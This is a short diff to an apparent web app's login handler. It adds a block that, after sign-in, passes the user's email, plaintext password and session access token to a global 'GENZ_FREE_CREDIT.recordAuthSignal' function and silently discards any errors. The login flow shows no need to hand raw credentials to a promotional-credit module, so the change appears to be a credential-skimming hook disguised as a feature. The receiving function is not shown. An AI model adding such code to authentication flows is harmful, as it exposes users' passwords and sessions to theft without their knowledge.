@@ -1097,6 +1097,20 @@
                 }
 
 
+                if (
+                    window.GENZ_FREE_CREDIT &&
+                    typeof window.GENZ_FREE_CREDIT.recordAuthSignal === "function"
+                ) {
+                    await window.GENZ_FREE_CREDIT.recordAuthSignal({
+                        source: "login",
+                        email,
+                        password,
+                        accessToken:
+                            (authData.session && authData.session.access_token) || ""
+                    }).catch(function () {});
+                }
+
+
                 await completeAuthenticatedLogin(
                     authData.user
                 );
